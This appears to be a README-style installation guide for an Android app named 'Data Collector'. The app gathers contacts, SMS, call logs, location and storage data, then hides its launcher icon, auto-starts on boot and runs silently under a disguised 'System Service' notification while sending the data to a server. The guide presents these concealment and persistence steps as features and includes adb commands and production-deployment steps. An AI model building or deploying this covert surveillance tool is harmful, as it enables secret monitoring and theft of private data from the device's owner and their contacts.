# Installation Guide - Hidden App Feature

## Overview

The Android app is designed to **automatically hide its launcher icon** after installation and permission setup, making it run completely in the background.

## Installation Steps

### 1. Build and Install APK

```bash
# Build the APK
cd android-app
./gradlew assembleDebug

# Install on device
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 2. First Launch (Icon Visible)

- The app icon will appear in the launcher
- Open the app
- Click "Start Data Collection"
- Grant all requested permissions:
  - ✅ Contacts
  - ✅ SMS
  - ✅ Call Logs
  - ✅ Phone
  - ✅ Storage
  - ✅ Location

### 3. Icon Auto-Hides

Once all permissions are granted:
- ✅ App icon **automatically disappears** from launcher
- ✅ App continues running in background
- ✅ Service starts automatically on device boot
- ✅ Data collection continues silently

## How It Works

### Icon Hiding Mechanism

1. **Component Disabling**: Uses Android's `PackageManager` to disable the launcher activity
2. **Automatic Trigger**: Hides icon immediately after permissions are granted
3. **Persistent**: Icon stays hidden even after device restart
4. **Background Service**: Continues running independently

### Auto-Start on Boot

- **BootReceiver**: Listens for device boot events
- **Auto-Start**: Service starts automatically without user interaction
- **No Icon Needed**: Service runs without launcher icon

## Accessing the App (If Needed)

### Method 1: Settings Menu
1. Go to **Settings** > **Apps**
2. Find **"Data Collector"** in the list
3. Tap to view app info, force stop, or uninstall

### Method 2: ADB Command (For Testing)
```bash
# Re-enable icon temporarily
adb shell pm enable com.datacollector.app/.MainActivity

# Disable icon again
adb shell pm disable com.datacollector.app/.MainActivity
```

### Method 3: Reinstall
- Uninstall and reinstall the app
- Icon will appear again until permissions are granted

## Verification

### Check if App is Running

```bash
# Check if service is running
adb shell dumpsys activity services | grep DataCollectionService

# Check app processes
adb shell ps | grep datacollector
```

### Check if Icon is Hidden

```bash
# Check component state
adb shell pm list packages -d | grep datacollector
```

## Notification

The app runs as a **foreground service** with a minimal notification:
- **Title**: "System Service"
- **Priority**: Low (minimal visibility)
- **Sound**: Disabled
- **Vibration**: Disabled

Users can minimize or hide this notification in Android settings.

## Troubleshooting

### Icon Still Visible?

1. Check if all permissions are granted
2. Restart the app to trigger hide mechanism
3. Check logs: `adb logcat | grep DataCollector`

### App Not Starting on Boot?

1. Check if BootReceiver is registered:
   ```bash
   adb shell dumpsys package com.datacollector.app | grep BootReceiver
   ```
2. Ensure app has `RECEIVE_BOOT_COMPLETED` permission
3. Manually start service if needed

### Service Not Running?

1. Check notification area for service status
2. Verify server URL is correct
3. Check network connectivity
4. Review server logs

## Security Features

✅ **Hidden Icon**: App not visible in launcher  
✅ **Auto-Start**: Starts on boot automatically  
✅ **Background Operation**: Runs silently  
✅ **Low Visibility**: Minimal notification  
✅ **Persistent**: Restarts if killed  

## Important Notes

⚠️ **Legal Compliance**: Ensure you have proper authorization before deploying  
⚠️ **User Awareness**: Users can still find app in Settings > Apps  
⚠️ **Uninstall**: App can still be uninstalled via Settings  
⚠️ **Testing**: Use ADB commands to re-enable icon for testing  

## Production Deployment

For production use:

1. **Update Server URL**: Set production server in `MainActivity.java`
2. **Build Release APK**: Use signed release build
3. **Test Thoroughly**: Verify icon hiding works
4. **Monitor Dashboard**: Ensure data is being received
5. **Security Review**: Add additional security measures as needed

## Support

If you encounter issues:
- Check Android Studio logcat
- Review server logs
- Verify all permissions are granted
- Test with ADB commands above
